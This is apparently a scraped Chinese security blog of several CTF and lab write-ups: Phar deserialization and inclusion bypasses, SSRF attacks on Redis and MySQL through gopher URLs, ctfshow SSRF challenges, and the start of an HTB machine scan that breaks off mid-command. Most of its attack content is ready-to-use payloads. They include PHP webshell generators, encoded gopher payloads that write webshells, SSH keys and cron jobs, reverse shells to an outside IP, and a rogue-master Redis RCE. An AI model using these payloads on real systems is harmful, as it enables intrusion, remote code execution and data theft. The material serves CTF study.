一些绕过方式伪造成其他格式的文件在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。 1$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); ///设置stub，增加gif文件头 phar不能出现在前面的字符12345compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txtphp://filter/read=convert.base64-encode/resource=phar://phar.phar 值得注意的是:那些可以使得phar文件的metadata反序列化的函数需要支持compress.bzip:或者php://filter协议等才行，比如if_file就不行 绕过后缀检查将phar.phar更改后缀不影响phar文件的最终执行,所以这一点很好绕过白名单 过滤__HALT_COMPILER();将phar文件进行gzip压缩 ，使用压缩后phar文件同样也能反序列化 (常用) linux下使用命令gzip phar.phar 生成 phar 文件签名修改对于某些情况，我们需要修改phar文件中的内容而达到某些需求(比如要绕过__wakeup要修改属性数量)，而修改后的phar文件由于文件发生改变，所以须要修改签名才能正常使用 (__wakeup绕过:在 PHP5 &lt; 5.6.25, PHP7 &lt; 7.0.10 的版本) 以默认的sha1签名为例： 1234567891011from hashlib import sha1with open('phar.phar', 'rb') as file: f = file.read() # 修改内容后的phar文件,以二进制文件形式打开 s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）s = s.replace(b'3:{', b'4:{')# 绕过__wakeuph = f[-8:] # 获取签名类型以及GBMB标识，各4个字节newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB) with open('newPhar.phar', 'wb') as file: file.write(newf) # 写入新文件 实验 123456789101112131415161718192021&lt;?phperror_reporting(0);highlight_file(__FILE__);class zixyd { public $code; public function __wakeup(){ echo &quot;die&quot;; exid(0); } public function __destruct() { echo '_destruct() called!'.&quot;&lt;/br&gt;&quot;; eval($this-&gt;code); }}$filename = $_GET['file'];echo file_get_contents($filename); 生成phar.phar文件 1234567891011121314&lt;?phpclass zixyd { public $code=&quot;eval(\\$_POST[1]);&quot;;}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new zixyd();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); 可以看到被__wakeup拦截了 执行脚本，绕过wakeup 123456789101112from hashlib import sha1with open('phar.phar', 'rb') as file: f = file.read()s = f[:-28]s = s.replace(b'1:{', b'2:{')h = f[-8:]newf = s + sha1(s).digest() + hwith open('newPhar.phar', 'wb') as file: file.write(newf) 生成newPhar.phar；成功绕过 Phar利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 补充Phar文件包含上面讲的都是phar反序列化；本题是利用phar文件包含；来自ctfshow-web803 12345678910111213&lt;?phperror_reporting(0);highlight_file(__FILE__);$file = $_POST['file'];$content = $_POST['content'];if(isset($content) &amp;&amp; !preg_match('/php|data|ftp/i',$file)){ if(file_exists($file.'.txt')){ include $file.'.txt'; }else{ file_put_contents($file,$content); }} 存在文件上传(当前目录确实是/var/www/html;但是没有权限)；文件包含对后缀有限制，并且文件名有过滤； 利用phar文件绕过；生成一个phar后门文件 1234567&lt;?php@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);$phar-&gt;stopBuffering(); 再利用python脚本,当前没有权限可以写，那就写到/tmp目录下 12345678import requestsurl = &quot;http://c2f01299-8a2b-4401-a26c-85e42c6142a3.challenge.ctf.show/&quot;data1 = {'file': '/tmp/phar.phar', 'content': open('phar.phar', 'rb').read()}data2 = {'file': 'phar:///tmp/phar.phar/test', 'content': '123', '1': 'system(&quot;cat f*&quot;);'}requests.post(url, data=data1)r = requests.post(url, data=data2)print(r.text) 确实没有可写的权限， 123456'1': 'system(&quot;id&quot;);'uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)'1': 'system(&quot;ls -l /var/www&quot;);'drwxr-xr-x 1 root root 4096 Jan 28 05:31 htmldrwxr-xr-x 3 root root 4096 Sep 22 2020 localhost 其实这里一开始我是想借用zip伪协议包含绕过的；像下面一样 生成一个test.txt文件，内容如下；再压缩为test.zip文件 1&lt;?php phpinfo();?&gt; 测试代码如下： 1234567891011121314 &lt;?phperror_reporting(0);highlight_file(__FILE__);$file = $_POST['file'];if( !preg_match('/php|data|ftp/i',$file)){// if(file_exists($file.'.txt')){ include $file.'.txt'; }else{ echo &quot;no&quot;; }//} 发现是可以成功的； 但是这个办法不可以用来解决web803；因为zip协议在file_exists判断不出来是文件","link":"/2024/01/20/Phar%E6%BC%8F%E6%B4%9E/"},{"title":"ssrf(redis)","text":"实验环境：kali+nginx+fpm; 提前安装redis(低于7版本才行，高于7的版本config set dir之类会报错)；安装php_curl扩展； 向Web目录中写webshell创建一个test.php;内容如下， 123456789101112131415161718&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url)){ $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); }else{ echo &quot;ssrf redis!&quot;; } ?&gt; payload我已经分为了四步；保证前一步执行成功(会返回+OK之类的字样)后；再去执行后一步；(失败会返回”ERR“) 1234config set dir /var/www/htmlquitgopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%250D%250Aquit 1234config set dbfilename shell.phpquitgopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dbfilename%2520shell.php%250D%250Aquit 1234set payload &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;quitgopher%3A%2F%2F127.0.0.1%3A6379%2F_set%2520payload%2520%2522%253C%253Fphp%2520eval(%255C%2524_POST%255B1%255D)%253B%253F%253E%2522%250D%250Aquit 1234savequitgopher%3A%2F%2F127.0.0.1%3A6379%2F_save%250D%250Aquit 执行成功后会发现/var/www/html目录下已经存在了shell.php；只不过除了我们的键值&lt;?php eval($_POST[1]);?&gt;还有其他一些东西，但是这并不影响php解析；但是这样会影响下一个方法(ssh写入公钥；但是也有办法处理这个问题)； 123cat shell.phpREDIS0006�payload▒&lt;?php eval($_POST[1]);?&gt;abbbbbbbbbb�&amp;@v��� 到这里实验就结束了，但是这个实验需要注意权限等问题；比如： 1，是否有权限向/var/www/html有写文件的操作；(默认的dir是/var/lib/redis) 2，如果有权限写入web目录，也要保证服务器有权限可以读我们写入的文件； 补充，这是将上面四步合成了一步，方便打比赛的时候直接用；(双重url编码了的) 1gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%250D%250aconfig%2520set%2520dbfilename%2520shell.php%250D%250aset%2520payload%2520%2522%253C%253Fphp%2520eval(%255C%2524_POST%255B1%255D)%253B%253F%253E%2522%250D%250asave%250D%250aquit 写入ssh公钥还是利用test.php 制作公私钥;会生成在当前用户的~/.ssh目录下 1ssh-keygen -t rsa payload我已经分为了四步；保证前一步执行成功(会返回+OK之类的字样)后；再去执行后一步；(失败会返回”ERR“) 第一步用换行的方式，保证公钥不会受其他字符影响 1234set publickey &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8GVS1wwIfWVDLGsoXHntxx5BaVrx1QrG5J7i3ZpoOf6HEz+ExYOEzUb0tGA6R477caXicuqhAGP4F6rLX9tyUaV7IHuZM2ZZJqo+8oVe1QCQlaUqjwgJAGpCcNnqWet/GFLfTJdDb57GgLLuA+ra5yDwkCuUzayB3We2cyUPqm2sbDIlIz0Nt3JLVNi9xa5SirFJ0iU2wzm+jsPT24/6jfvAbWWQHJTxNlglSogBSvNo6Cao3c9hbLxhmEiE1InNBOK8XBcAG739RZYRNKDOJLovvNiC2c47w5HrYAc7ge+eK1PM32bpVvNjBSNNrhkxnHiGCcHLOZnkxepKs3X0fmKzMxCRtCjr8YJEpbf8nSbMY1IxoSZz6RUnP4K/J6nfPt9NV8gog6lT2K5S71MNSvT96shVut0C8UDc+dQzv2tl6SzOy9rOeHhlBDqQEm0FKfP9EPucy4yLanULPIl4KqhexbHdz/uQ5UCUKR8Z/l3Vbmn2uM2Hs586O22EezNc= kali@kali\\n\\n\\n&quot;quitgopher%3A%2F%2F127.0.0.1%3A6379%2F_set%2520publickey%2520%2522%255Cn%255Cn%255Cnssh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQC8GVS1wwIfWVDLGsoXHntxx5BaVrx1QrG5J7i3ZpoOf6HEz%252BExYOEzUb0tGA6R477caXicuqhAGP4F6rLX9tyUaV7IHuZM2ZZJqo%252B8oVe1QCQlaUqjwgJAGpCcNnqWet%252FGFLfTJdDb57GgLLuA%252Bra5yDwkCuUzayB3We2cyUPqm2sbDIlIz0Nt3JLVNi9xa5SirFJ0iU2wzm%252BjsPT24%252F6jfvAbWWQHJTxNlglSogBSvNo6Cao3c9hbLxhmEiE1InNBOK8XBcAG739RZYRNKDOJLovvNiC2c47w5HrYAc7ge%252BeK1PM32bpVvNjBSNNrhkxnHiGCcHLOZnkxepKs3X0fmKzMxCRtCjr8YJEpbf8nSbMY1IxoSZz6RUnP4K%252FJ6nfPt9NV8gog6lT2K5S71MNSvT96shVut0C8UDc%252BdQzv2tl6SzOy9rOeHhlBDqQEm0FKfP9EPucy4yLanULPIl4KqhexbHdz%252FuQ5UCUKR8Z%252Fl3Vbmn2uM2Hs586O22EezNc%253D%2520kali%2540kali%255Cn%255Cn%255Cn%2522%250D%250Aquit 这里的目录更具情况而定，只有往某个用户的.ssh目录有写的权限就可以；当然要是有root权限就更好了； 1234config set dir /home/kali/.ssh/quitgopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%252Fhome%252Fkali%252F.ssh%252F%250D%250Aquit 这是ssh的规定，必须为authorized_keys文件名 123config set dbfilename &quot;authorized_keys&quot;gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dbfilename%2520%2522authorized_keys%2522%250D%250Aquit 1234savequitgopher%3A%2F%2F127.0.0.1%3A6379%2F_save%250D%250Aquit 最后用ssh连接即可 1ssh -i id_rsa username@ip 到这里实验就结束了，但是这个实验需要注意权限和服务等问题；比如： 1，是否有权限向.ssh有写文件的操作；注意这里不一定非得是root用户；往往root用户的权限没这么容易拿到；如果能往普通用户的.ssh写入也是可行的； 2，需要靶机开启ssh服务，就是是22端口(可以用nmap探测) 定时任务还是利用test.php 查看/var/spool/cron目录权限 1drwxr-xr-x 3 root root 4096 2023年 4月 5日 cron 这里的定时任务是在/var/spool/cron目录，而不是/etc/crontab文件 来自gpt: /var/spool/cron目录通常用于存储用户特定的定时任务（cron jobs）。在这个目录下，每个用户都有一个以其用户名命名的文件，用于存储该用户的定时任务。这些文件包含了用户设置的定时任务的详细信息，比如何时运行、运行的命令等。这些文件通常由cron守护进程读取，并按照预定的时间执行其中定义的命令。 大概就是下面四步；但是还是用工具来的快 12345set cron &quot;\\n\\n* * * * * bash -i&gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave 1/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1' 我是直接用的Gopherus工具 1234567891011What do you want?? (ReverseShell/PHPShell): reverseshellGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): 81.71.13.76What can be his Crontab Directory location## For debugging(locally) you can use /var/lib/redis : Your gopher link is ready to get Reverse Shell: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2466%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/81.71.13.76/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0ABefore sending request plz do `nc -lvp 1234` 到这里实验就结束了，但是这个实验需要注意权限等问题；比如： 1，需要有权限往/var/spool/cron目录写文件，这通常只用以root身份运行redis-server才有希望; 2，写入后的文件需要有可执行权限才可以执行(通常不会有可执行权限); 3, 需要靶机可以出网，才可以反弹shell; 主从复制大概就是这几条命令 123456config set dir /tmp/config set dbfilename exp.soslaveof 81.71.13.76 6666module load /tmp/exp.sosystem.exec 'whoami'quit https://github.com/xmsec/redis-ssrfhttps://github.com/n0b0dyCN/redis-rogue-server要进行主从复制RCE，就需要利用到这两个工具，第一个用于生成payload，也可以启动恶意服务，第二个主要是exp.so。注意需要将第二个工具exp.so导入到第一个工具下，也就是和rogue-server.py同目录，这里先开启一下rogue-server.py 用于伪装为主redis，它开启的端口为6666 由于module命令是在Redis 4.0及更高版本中引入的,而我本地的redis版本太低，干脆用春秋杯网络安全联赛冬季赛中的ezezez_php来做实验； 访问靶机，index.php如下； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;?phphighlight_file(__FILE__);include &quot;function.php&quot;;class Rd{ public $ending; public $cl; public $poc; public function __destruct() { echo &quot;All matters have concluded&quot;.&quot;&lt;/br&gt;&quot;; } public function __call($name, $arg) { foreach ($arg as $key =&gt; $value) { if ($arg[0]['POC'] == &quot;0.o&quot;) { $this-&gt;cl-&gt;var1 = &quot;get&quot;; } } }}class Poc{ public $payload; public $fun; public function __set($name, $value) { $this-&gt;payload = $name; $this-&gt;fun = $value; } function getflag($paylaod) { echo &quot;Have you genuinely accomplished what you set out to do?&quot;.&quot;&lt;/br&gt;&quot;; file_get_contents($paylaod); }}class Er{ public $symbol; public $Flag; public function __construct() { $this-&gt;symbol = True; } public function __set($name, $value) { if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',base64_decode($this-&gt;Flag))){ $value($this-&gt;Flag); } else { echo &quot;NoNoNo,please you can look hint.php&quot;.&quot;&lt;/br&gt;&quot;; } }}class Ha{ public $start; public $start1; public $start2; public function __construct() { echo $this-&gt;start1 . &quot;__construct&quot; . &quot;&lt;/br&gt;&quot;; } public function __destruct() { if ($this-&gt;start2 === &quot;o.0&quot;) { $this-&gt;start1-&gt;Love($this-&gt;start); echo &quot;You are Good!&quot;.&quot;&lt;/br&gt;&quot;; } }}function get($url) { $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output);}if (isset($_POST['pop'])) { $a = unserialize($_POST['pop']);} else { die(&quot;You are Silly goose!&quot;);}?&gt;You are Silly goose! 1Ha(__destruct) =&gt; Rd(__call) =&gt; Er(__set) =&gt; get($url) POC 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Rd{ public $ending; public $cl; public $poc;}class Er{ public $symbol; public $Flag;}class Ha{ public $start; public $start1; public $start2;}$a = new Ha;$a-&gt;start2 = &quot;o.0&quot;;$b = new Rd;$a-&gt;start1 = $b;$a-&gt;start= array( 'POC' =&gt; '0.o');$c = new Er;$b -&gt;cl = $c;$c-&gt;Flag = '';echo serialize($a); payload我已经分为了六步；保证前一步执行成功(会返回+OK之类的字样)后；再去执行后一步；(失败会返回”ERR“) 123456config set dir /tmp/quitgopher://127.0.0.1:6379/_config%20set%20dir%20%2Ftmp%2F%0D%0AquitZ29waGVyOi8vMTI3LjAuMC4xOjYzNzkvX2NvbmZpZyUyMHNldCUyMGRpciUyMCUyRnRtcCUyRiUwRCUwQXF1aXQ= 1234config set dbfilename exp.soquitgopher://127.0.0.1:6379/_config%20set%20dbfilename%20exp.so%0D%0Aquit 执行这一步前，需要在vps上执行python2 rogue-server.py命令 1234slaveof 81.71.13.76 6666quitgopher://127.0.0.1:6379/_slaveof%2081.71.13.76%206666%0D%0Aquit 1234module load /tmp/exp.soquitgopher://127.0.0.1:6379/_module%20load%20%2Ftmp%2Fexp.so%0D%0Aquit 接下来就可以命令执行了 1234system.exec 'cat /proc/self/environ'quitgopher://127.0.0.1:6379/_system.exec%20'cat%20%2Fproc%2Fself%2Fenviron'%0D%0Aquit 也可以用这条命令反弹shell 12system.rev 81.71.13.76 5656quit 将上面的payload进行base64编码，并赋值给$c-&gt;Flag ；为了不出错，分六步打；payload大概是下面的样子，就是base64的内容会改一下 1O:2:&quot;Ha&quot;:3:{s:5:&quot;start&quot;;a:1:{s:3:&quot;POC&quot;;s:3:&quot;0.o&quot;;}s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:{s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:{s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:88:&quot;Z29waGVyOi8vMTI3LjAuMC4xOjYzNzkvX2NvbmZpZyUyMHNldCUyMGRpciUyMCUyRnRtcCUyRiUwRCUwQXF1aXQ=&quot;;}s:3:&quot;poc&quot;;N;}s:6:&quot;start2&quot;;s:3:&quot;o.0&quot;;} 到这里实验就结束了，但是这个实验需要注意redis版本等问题；用主从赋值虽然麻烦，但是没有其他方法那么多限制，只需要注意一下redis的版本支持module等命令和可以连外网；","link":"/2024/01/22/ssrf%E6%89%93redis/"},{"title":"ctfshow(ssrf)","text":"web3511234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; 其中，curl_init()函数用于初始化一个CURL对象，curl_setopt()函数用于设置CURL请求的选项，curl_exec()函数用于执行CURL请求并获取响应结果，curl_close()函数用于关闭CURL对象。 使用curl_setopt()函数设置了请求的URL、CURLOPT_RETURNTRANSFER选项和CURLOPT_HEADER选项。其中，CURLOPT_RETURNTRANSFER选项设置为1时，表示将获取的响应结果以字符串的形式返回。CURLOPT_HEADER选项设置为0时，则表示在响应结果中不包含响应头部信息。 payload 1POST:url=http://127.0.0.1/flag.php web352-353(回环地址绕过)12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){if(!preg_match('/localhost|127.0.0/')){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; parse_url函数 1234567891011121314$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);输出:Array([scheme] =&gt; http[host] =&gt; hostname[user] =&gt; username[pass] =&gt; password[path] =&gt; /path[query] =&gt; arg=value[fragment] =&gt; anchor) 可利用一个在线网站：IP地址转化为进制地址https://tool.520101.com/wangluo/jinzhizhuanhuan/ payload: ip地址还可以用十进制，八进制，十六进制表示 123456url=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.phpurl=http://0.0.0.0/flag.php 0.0.0.0代表本机url=http://0x7F000001/flag.php 16进制地址url=http://2130706433/flag.php 10进制地址url=http://127.1/flag.php web354(DNS_A记录)12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){if(!preg_match('/localhost|1|0|。/i', $url)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; 方法一 用DNS-Rebinding 利用下面这个网站 https://lock.cmpxchg8b.com/rebinder.html 可惜的域名里面有0和1 方法二 更改自己的域名的A记录为127.0.0.1 payload(注意dns缓存) 1url=http://langblog.top/flag.php 补充 好像还可以用302重定向绕过 https://www.bilibili.com/video/BV1yN4y147qK/?spm_id_from=333.788&amp;vd_source=556180919ced41bfcd02c06776ecf153 web355(长度限制)1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$host=$x['host'];if((strlen($host)&lt;=5)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; 0在windows中被解析为0.0.0.0。在Linux中被解析为127.0.0.1 payload 12url=http://0/flag.phpurl=http://127.01/flag.php web356(长度限制)1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$host=$x['host'];if((strlen($host)&lt;=3)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; payload 1url=http://0/flag.php web357(DNS Rebinding)12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$ip = gethostbyname($x['host']);echo '&lt;/br&gt;'.$ip.'&lt;/br&gt;';if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die('ip!');}echo file_get_contents($_POST['url']);}else{ die('scheme');}?&gt; gethostbyname函数用于获取指定主机名的IP地址。在这里，$x[‘host’]是一个数组$x中的元素，[‘host’]是数组$x中的一个键。这行代码的作用是将$x[‘host’]对应的主机名解析为IP地址，并将结果赋给变量$ip。 !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) 作用是检查变量$ip是否为一个合法的公共IP地址，如果不是，则输出’ip!’并终止程序。具体来说，它使用了PHP中的filter_var函数，结合了FILTER_VALIDATE_IP、FILTER_FLAG_NO_PRIV_RANGE和FILTER_FLAG_NO_RES_RANGE三个过滤器。这些过滤器的作用是验证IP地址的格式，并排除私有IP地址和保留IP地址 利用DNS Rebinding可以绕过第一次的检查 DNS重新绑定是计算机攻击的一种形式。 在这种攻击中，恶意网页会导致访问者运行客户端脚本，攻击网络上其他地方的计算机。 从理论上讲，同源策略可防止发生这种情况：客户端脚本只能访问为脚本提供服务的同一主机上的内容。 比较域名是实施此策略的重要部分，因此DNS重新绑定通过滥用域名系统（DNS）来绕过这种保护。这种攻击可以通过让受害者的网络浏览器访问专用IP地址的机器并将结果返回给攻击者来破坏专用网络。 它也可以用于使用受害者机器发送垃圾邮件，分布式拒绝服务攻击或其他恶意活动。 payload 1web354的方法一 web358(URL bypass)12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){ echo file_get_contents($url);} 正则表达式的意思是以http://ctf.开头，以show结尾。 123456┌──(root㉿kali)-[/var/www/html]└─# echo &quot;flag{this is test }&quot; &gt; flag.php ┌──(root㉿kali)-[/var/www/html]└─# curl http://ctf.@127.0.0.1/flag.php?showflag{this is test } 把ctf.当成username，不影响地址解析 123456789101112131415161718&lt;?php$url=&quot;http://ctf.@127.0.0.1/flag.php?show&quot;;$url=parse_url($url);var_dump($url);?&gt;array(5) { [&quot;scheme&quot;]=&gt; string(4) &quot;http&quot; [&quot;host&quot;]=&gt; string(9) &quot;127.0.0.1&quot; [&quot;user&quot;]=&gt; string(4) &quot;ctf.&quot; [&quot;path&quot;]=&gt; string(9) &quot;/flag.php&quot; [&quot;query&quot;]=&gt; string(4) &quot;show&quot;} payload 1http://ctf.@127.0.0.1/flag.php?show web359(Mysql)123456789&lt;/div&gt; &lt;form action=&quot;check.php&quot; method=&quot;post&quot;&gt; &lt;input name=&quot;u&quot; type=&quot;text&quot; class=&quot;text&quot; value=&quot;Username&quot; onfocus=&quot;this.value = '';&quot; onblur=&quot;if (this.value == '') {this.value = 'Username';}&quot; &gt; &lt;div class=&quot;key&quot;&gt; &lt;input password=&quot;p&quot; type=&quot;password&quot; value=&quot;Password&quot; onfocus=&quot;this.value = '';&quot; onblur=&quot;if (this.value == '') {this.value = 'Password';}&quot;&gt; &lt;/div&gt; &lt;input type=&quot;hidden&quot; name=&quot;returl&quot; value=&quot;https://404.chall.ctf.show/&quot;&gt; &lt;div class=&quot;signin&quot;&gt; 利用点在returl,利用gopherus工具打无密码mysql，并且知道数据库的username； 在非交互模式下登录并操作MySQL只能在无需密码认证情况下进行, 12345./gopherus.py --exploit mysqlusername:root写入一句话木马select &quot;&lt;?php @eval($_POST['cmd']);?&gt;&quot; into outfile '/var/www/html/shell.php'; payload 1gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254f%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501 web360(redis)1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; 题目提示了打redis， 尝试往web目录写webshell 利用gopherus 1234567891011./gopherus.py --exploit redisWhat do you want?? (ReverseShell/PHPShell): phpshellGive web root location of server (default is /var/www/html): Give PHP Payload (We have default PHP Shell): Your gopher link is Ready to get PHP Shell: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A","link":"/2024/01/22/ctfshow(ssrf)/"},{"title":"Pilgrimage(HTB)","text":"信息搜集nmap端口扫描发现22和80端口 123456789sudo nmap -p- --min-rate 10000 10.10.11.219Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-24 12:37 CSTWarning: 10.10.11.219 giving up on port because retransmission cap hit (10).Nmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.090s latency).Not shown: 63504 closed tcp ports (reset), 2029 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open http nmap详细扫描发现 pilgrimage.htb (10.10.11.219)以及Git repository，将域名和ip加入/etc/hosts; 123456789101112131415161718192021222324252627sudo nmap -sT 